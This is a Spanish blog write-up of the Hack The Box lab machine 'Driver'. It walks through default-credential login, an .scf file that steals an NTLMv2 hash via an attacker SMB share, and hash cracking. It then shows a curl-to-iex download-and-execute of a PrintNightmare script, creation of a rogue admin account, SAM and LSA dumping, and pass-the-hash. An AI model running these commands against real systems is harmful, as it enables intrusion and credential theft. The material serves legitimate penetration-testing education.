---
layout: single
title: Driver - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Driver de la plataforma de Hack The Box después de usar credenciales por defecto en el servicio web podremos subir un archivo .scf para robar el hash ntlmv2 del usuario que esta por detrás revisando todo lo que suben, una vez crackeado el hash nos conectaremos con evil-winrm y para la escalada de privilegios explotaremos una vulnerabilidad que abusa de un printer driver que esta en la maquina victima y podremos agregar un usuario al grupo Administrators"
date: 2024-04-03
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-driver/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - SCF Malicious File
  - PrintNightmare
  - CVE-2021-1675
---

## PortScan

- Comenzamos con el escaneo de puertos abiertos y sus servicios para ver las tecnologías que están empleando.

```bash
➜  nmap nmap -sCV -p80,135,445,5985 10.129.250.229 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 19:06 CST
Nmap scan report for 10.129.250.229
Host is up (0.51s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2024-04-03T08:06:49
|_  start_date: 2024-04-03T08:01:21
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

## Enumeración

- Tenemos el puerto **80** abierto al parecer nos redirige a una pagina de `login` ya que en el escaneo nos da un **401 Unauthorized**.

```ruby
➜  nmap whatweb http://10.129.250.229
http://10.129.250.229 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.250.229], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

- Esta es la web.

<p align="center">
<img src="/assets/images/htb-writeup-driver/1.png">
</p>

- Si probamos con credenciales por defecto como `admin:admin` vemos que podemos entrar.

<p align="center">
<img src="/assets/images/htb-writeup-driver/2.png">
</p>

## Shell as tony

- Si nos vamos al apartado de **Firmware Updates** vemos que podemos subir archivos y alguien lo va revisar ya con que nos digan eso podemos hacer un ataque para robar su `hash NTLMv2`.

<p align="center">
<img src="/assets/images/htb-writeup-driver/3.png">
</p>

- La mayoría de veces cuando puedes subir un archivo para robar un hash NTLMv2 es subir un `.scf` que este archivo hace referencia a un `icon` en un `SMB share` cuando un usuario abre la carpeta desde el Explorador de archivos intenta conectarse de vuelta para obtener un archivo de icono desde nuestro recurso compartido SMB gracias a esto obtendremos el hash de la victima.

```bash
➜  content cat icon.scf
[Shell]
IconFile=\\10.10.14.19\zi\dame.ico
```

- Ahora ejecutamos el `impacket-smbserver` para ofrecer el recurso compartido y allí nos llegue el hash.

```bash
➜  content impacket-smbserver zi . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Ahora subimos el archivo.

<p align="center">
<img src="/assets/images/htb-writeup-driver/4.png">
</p>

- Al subirlo nos llega el hash.

```bash
➜  content impacket-smbserver zi . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.250.229,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:23bb0f7e862bb961d0a9575629a94420:010100000000000080a35aa66585da013f8e51d6f6f0512e00000000010010004f0046005a004a006a00480067004700030010004f0046005a004a006a00480067004700020010006500780041004500480047006e006d00040010006500780041004500480047006e006d000700080080a35aa66585da01060004000200000008003000300000000000000000000000002000002d6d666541de235278af71556e18b8f6cca24e3bc26bbfa175e94480b52e4e710a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003900000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:zi)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:zi)
[*] Closing down connection (10.129.250.229,49414)
[*] Remaining connections []
```

- Ahora simplemente crackeamos el hash.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2024-04-02 19:25) 8.333g/s 264533p/s 264533c/s 264533C/s !!!!!!..225566
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

- Verificamos que son correctas.

```bash
➜  content crackmapexec smb 10.129.250.229 -u 'tony' -p 'liltony'
SMB         10.129.250.229  445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.250.229  445    DRIVER           [+] DRIVER\tony:liltony
```

- Como tenemos el puerto de `smb` abierto podemos comprobar si tenemos acceso de escritura o del algún otro recurso compartido.

```bash
➜  content crackmapexec smb 10.129.250.229 -u 'tony' -p 'liltony' --shares
SMB         10.129.250.229  445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.250.229  445    DRIVER           [+] DRIVER\tony:liltony
SMB         10.129.250.229  445    DRIVER           [+] Enumerated shares
SMB         10.129.250.229  445    DRIVER           Share           Permissions     Remark
SMB         10.129.250.229  445    DRIVER           -----           -----------     ------
SMB         10.129.250.229  445    DRIVER           ADMIN$                          Remote Admin
SMB         10.129.250.229  445    DRIVER           C$                              Default share
SMB         10.129.250.229  445    DRIVER           IPC$                            Remote IPC
```

- Pero no tenemos nada interesante algo que podemos hacer es ver si el usuario forma parte del grupo `Remote Management Users` para usar `evil-winrm` y conectarnos.

```bash
➜  content crackmapexec winrm 10.129.250.229 -u 'tony' -p 'liltony'
SMB         10.129.250.229  5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.129.250.229  5985   DRIVER           [*] http://10.129.250.229:5985/wsman
WINRM       10.129.250.229  5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

- Y bueno podemos conectarnos y leer la `user flag`.

```bash
➜  content evil-winrm -i 10.129.250.229 -u tony -p liltony

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> type C:\Users\tony\Desktop\user.txt
3bc6aa3a19aa59e9524f16993158ab66
```

## Escalada de Privilegios

- Para enumerar el sistema podemos subir winPEASx64 <https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f>.

- Y lo subimos ala maquina.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/Driver/content/winPEASx64.exe to C:\Users\tony\Documents\winPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\tony\Documents>
```

- Lo mas interesante de todo lo que nos reporto el script fue el historial de `Powershell` del usuario con el que estamos y encontramos que ejecuta 3 comandos.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> type C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

- Vemos que en el primero comando lo que esta intenta hacer es añadir una impresora, si buscamos vulnerabilidades para eso encontramos el siguiente <https://github.com/calebstewart/CVE-2021-1675> que lo que hace es que podemos crear un usuario Administrador donde nosotros indicamos el usuario y la contraseña.

```bash
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37
Receiving objects: 100% (40/40), 127.17 KiB | 458.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
➜  content cd CVE-2021-1675
➜  CVE-2021-1675 git:(main) ls
CVE-2021-1675.ps1  README.md  nightmare-dll
```

- Ahora lo subimos.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> upload CVE-2021-1675.ps1

Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> upload CVE-2021-1675.ps1

Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!
```

- Si importamos el modulo vemos que no podemos por una política definida en el sistema.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module .\CVE-2021-1675.ps1
File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\CVE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```

- Vamos a subirlo de otra forma.

```bash
➜  content python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Lo que podemos hacer es descargarlo con `curl` y usar `iex` o `Invoke-Expression` además de usar el parámetro `-UseBasicParsing` que se utiliza con el `cmdlet` `Invoke-WebReques`t en `Porwershell`.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> curl 10.10.14.19:80/CVE-2021-1675.ps1 -UseBasicParsing | iex
```

- Ahora vamos añadir nuestro usuario `Administrador`.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser migue
lito -NewPassword miguel123
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user miguelito as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

- Ahora comprobamos que el usuario forme parte del grupo `Administrators` para poder conectarnos.

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> net user miguelito
User name                    miguelito
Full Name                    miguelito
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/3/2024 2:06:36 AM
Password expires             Never
Password changeable          4/3/2024 2:06:36 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

- Ahora comprobamos con `crackmapexec`.

```bash
➜  content crackmapexec smb 10.129.250.229 -u miguelito -p miguel123
SMB         10.129.250.229  445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.250.229  445    DRIVER           [+] DRIVER\miguelito:miguel123 (Pwn3d!)
```

## Shell as Administrator and root flag

- Ahora ya simplemente nos conectamos y podemos leer la flag.

```bash
➜  content evil-winrm -i 10.129.250.229 -u miguelito -p miguel123

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miguelito\Documents> type C:\Users\Administrator\Desktop\root.txt
fce5289973391fd96a5db6dc2301f1cd
```

- En caso de que queramos conectarnos como el usuario **Administrator** simplemente podemos `dumpear` la `sam` y ver los hashes.

```bash
➜  content crackmapexec smb 10.129.250.229 -u miguelito -p miguel123 --sam
SMB         10.129.250.229  445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.250.229  445    DRIVER           [+] DRIVER\miguelito:miguel123 (Pwn3d!)
SMB         10.129.250.229  445    DRIVER           [+] Dumping SAM hashes
SMB         10.129.250.229  445    DRIVER           Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
SMB         10.129.250.229  445    DRIVER           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.250.229  445    DRIVER           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.250.229  445    DRIVER           tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
SMB         10.129.250.229  445    DRIVER           miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
SMB         10.129.250.229  445    DRIVER           [+] Added 5 SAM hashes to the database
```

- También lo podemos hacer con `impacket-secretsdump`.

```bash
➜  content impacket-secretsdump 'driver.htb/miguelito:miguel123@10.129.250.229'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
DRIVER\tony:liltony
[*] DPAPI_SYSTEM
dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e
dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

- Ahora aplicamos `passathehash` y nos conectamos como el usuario `Administrator`.

```bash
➜  content evil-winrm -i 10.129.250.229 -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
driver\administrator
```
